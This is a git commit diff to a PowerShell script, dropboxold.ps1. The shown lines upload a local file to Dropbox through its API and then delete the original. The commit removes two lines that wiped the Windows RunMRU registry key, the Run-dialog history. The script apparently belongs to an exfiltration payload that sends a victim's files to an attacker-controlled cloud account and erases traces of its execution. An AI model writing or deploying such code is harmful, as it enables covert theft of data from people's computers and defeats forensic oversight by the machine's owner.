2b257461335fc473b72b0192793149c2dfed614e
thaloot <150231781+thaloot@users.noreply.github.com>
2023-11-08 09:57:31 +0100

    Update dropboxold.ps1

--- dropboxold.ps1
+++ dropboxold.ps1
@@ -11,5 +11,4 @@ $headers.Add("Dropbox-API-Arg", $arg)
 $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 rm $SourceFilePath
-$RegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
-Remove-Item -Path $RegistryPath
+
